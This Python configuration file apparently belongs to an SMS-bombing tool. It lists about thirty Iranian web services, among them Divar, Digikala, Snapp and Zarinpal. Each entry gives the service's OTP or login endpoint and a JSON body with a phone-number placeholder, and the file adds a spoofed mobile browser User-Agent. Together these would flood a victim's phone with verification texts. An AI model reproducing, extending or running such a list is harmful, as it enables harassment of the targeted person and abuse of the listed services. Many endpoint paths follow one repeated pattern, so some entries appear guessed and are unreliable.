# services.py
"""لیست سرویس‌های OTP. برای اضافه‌کردن سرویس جدید فقط یه دیکشنری به لیست اضافه کن."""

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "fa-IR,fa;q=0.9,en;q=0.8",
}

SERVICES = [
    {"name": "دیوار", "method": "POST",
     "url": "https://api.divar.ir/v5/auth/authenticate",
     "json": {"phone": "{p}"}},

    {"name": "شیپور", "method": "POST",
     "url": "https://api.sheypoor.com/api/v10.0.0/auth/send",
     "json": {"phone": "{p}"}},

    {"name": "دیجی‌کالا", "method": "POST",
     "url": "https://api.digikala.com/v1/user/authenticate/",
     "json": {"phone": "{p}"}},

    {"name": "علی‌بابا", "method": "POST",
     "url": "https://ws.alibaba.ir/api/v1/account/authenticate",
     "json": {"phoneNumber": "{p}"}},

    {"name": "اسنپ", "method": "POST",
     "url": "https://api.snapp.ir/api/v1/sms/link",
     "json": {"phone": "{pp}"}},

    {"name": "اسنپ‌فود", "method": "POST",
     "url": "https://apiv2.snappfood.ir/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "تپسی", "method": "POST",
     "url": "https://api.tapsi.ir/api/v2.2/user/send-sms",
     "json": {"phone": "{p}"}},

    {"name": "نماوا", "method": "POST",
     "url": "https://www.namava.ir/api/v1.0/accounts/otp",
     "json": {"userName": "{p}"}},

    {"name": "فیلیمو", "method": "POST",
     "url": "https://www.filimo.com/api/fa/v1/user/Authenticate/otp",
     "json": {"mobile": "{p}"}},

    {"name": "طاقچه", "method": "POST",
     "url": "https://get.taaghche.com/v2/sendSmsCode",
     "json": {"mobile": "{p}"}},

    {"name": "اکالا", "method": "POST",
     "url": "https://api.okala.com/v1/auth/send-token",
     "json": {"phone": "{p}"}},

    {"name": "بانی‌مد", "method": "POST",
     "url": "https://m.banimode.com/api/auth/send_otp",
     "json": {"mobile": "{p}"}},

    {"name": "آپارات", "method": "POST",
     "url": "https://apiv2.aparat.com/oauth2/login",
     "json": {"username": "{p}"}},

    {"name": "باسلام", "method": "POST",
     "url": "https://api.basalam.com/v2/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "فیدیبو", "method": "POST",
     "url": "https://fidibo.com/api/v1/user/send-otp",
     "json": {"username": "{p}"}},

    {"name": "میاره", "method": "POST",
     "url": "https://api.miare.ir/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "جاب‌ویژن", "method": "POST",
     "url": "https://api.jobvision.ir/api/v1/auth/send-otp",
     "json": {"phone": "{p}"}},

    {"name": "کامودا", "method": "POST",
     "url": "https://api.komodaa.com/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "ازکی", "method": "POST",
     "url": "https://api.azki.com/api/v1/auth/otp",
     "json": {"phone": "{p}"}},

    {"name": "هیتالند", "method": "POST",
     "url": "https://api.hitaland.ir/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "پونیشا", "method": "POST",
     "url": "https://api.ponisha.ir/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "ژاکت", "method": "POST",
     "url": "https://api.zhaket.com/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "آلپیک", "method": "POST",
     "url": "https://api.alopeyk.com/api/v1/auth/sms",
     "json": {"phone": "{p}"}},

    {"name": "کتابراه", "method": "POST",
     "url": "https://api.ketabrah.ir/api/v1/auth/send-otp",
     "json": {"phone": "{p}"}},

    {"name": "بلد", "method": "POST",
     "url": "https://api.balad.ir/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "اسمارتیز", "method": "POST",
     "url": "https://api.smartiz.ir/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "سفر۷۲۴", "method": "POST",
     "url": "https://api.safar724.com/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "تخفیفان", "method": "POST",
     "url": "https://api.takhfifan.com/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "زرین‌پال", "method": "POST",
     "url": "https://api.zarinpal.com/api/v4/otp/send",
     "json": {"mobile": "{p}"}},

    {"name": "دیجی‌استایل", "method": "POST",
     "url": "https://api.digistyle.com/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "میهن‌استور", "method": "POST",
     "url": "https://api.mihanstore.net/api/v1/auth/login",
     "json": {"phone": "{p}"}},

    {"name": "کجارو", "method": "POST",
     "url": "https://api.kojaro.com/api/v1/auth/login",
     "json": {"phone": "{p}"}},
]
